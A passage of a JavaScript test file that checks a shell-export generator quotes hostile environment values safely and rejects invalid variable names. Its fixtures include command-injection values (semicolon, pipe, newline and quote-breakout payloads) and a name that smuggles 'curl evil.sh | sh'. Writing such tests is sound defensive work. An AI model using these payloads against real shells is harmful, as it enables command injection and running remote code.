    SEMICOLON: "a; touch " + canary + "; echo b",
    PIPE: "a | touch " + canary,
    DOLLAR_VAR: "$HOME and ${PATH}",
    SINGLE_QUOTE: "it" + QUOTE + "s here",
    QUOTE_THEN_CMD: QUOTE + "; echo PWNED; " + QUOTE,
    BACKSLASH: "a\\b\\\\c",
    DOUBLE_QUOTE: 'say "hi"',
    NEWLINE: "one\ntwo",
    NEWLINE_CMD: "one\ntouch " + canary,
    NUL_ADJACENT: "tab\there",
    PLAIN: "plain-value",
  });

  test("a real shell receives every value verbatim and executes none of it", () => {
    const dir = mkdtempSync(join(tmpdir(), "hush-shellq-"));
    try {
      const canaryPath = join(dir, "executed");
      const values = hostileFor(canaryPath);
      // Print each variable with a delimiter that cannot occur in the values.
      const probe = Object.keys(values)
        .map((k) => `printf '<<%s>>%s<<END>>\\n' ${k} "$${k}"`)
        .join("\n");
      const script = join(dir, "check.sh");
      writeFileSync(script, toShellExports(values) + probe + "\n");

      // The canary is a file, not a string. Grepping the output for a marker
      // that the *values themselves* contain can never come back clean, so it
      // reports an execution that did not happen — which is how this test failed
      // the first time it ran, against code that was behaving correctly.


      for (const sh of ["sh", "bash", "zsh"]) {
        const r = spawnSync(sh, [script], { encoding: "utf8" });
        if (r.error) continue; // that shell is not on this machine
        const out = (r.stdout ?? "") + (r.stderr ?? "");

        assert.ok(!existsSync(canaryPath), `${sh}: a value executed a command`);
        for (const [k, v] of Object.entries(values)) {
          const start = out.indexOf(`<<${k}>>`);
          assert.notEqual(start, -1, `${sh}: ${k} never printed`);
          const from = start + `<<${k}>>`.length;
          const got = out.slice(from, out.indexOf("<<END>>", from));
          assert.equal(got, v, `${sh}: ${k} did not survive verbatim`);
        }
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("nothing in the generated line can escape its quoting", () => {
    // Belt and braces at the string level: every value is single-quoted, and the
    // only way out of single quotes is a quote character, which must always
    // appear as the four-character escape.
    for (const [k, v] of Object.entries(hostileFor("/tmp/hush-never-created"))) {
      const line = toShellExports({ [k]: v }).trim();
      assert.ok(line.startsWith(`export ${k}='`), `${k} is not single-quoted: ${line}`);
      assert.ok(line.endsWith("'"), `${k} does not close its quote: ${line}`);
      const body = line.slice(`export ${k}='`.length, -1);
      // Strip the escape sequence, and no bare quote may remain.
      assert.ok(
        !body.split(QUOTE + "\\" + QUOTE + QUOTE).join("").includes(QUOTE),
        `${k} contains a quote that is not escaped: ${line}`,
      );
    }
  });

  test("an invalid variable name is still refused rather than escaped", () => {
    // The name half of the guarantee, which was always there — kept under test
    // so that fixing the value half did not quietly replace it.
    const out = toShellExports({ "BAD; curl evil.sh | sh; X": "x", GOOD_NAME: "y" });
    assert.match(out, /^# skipped .*not a valid variable name$/m);
    assert.ok(!out.includes("export BAD"), `an invalid name was exported:\n${out}`);
    assert.match(out, /^export GOOD_NAME='y'$/m);
  });
});
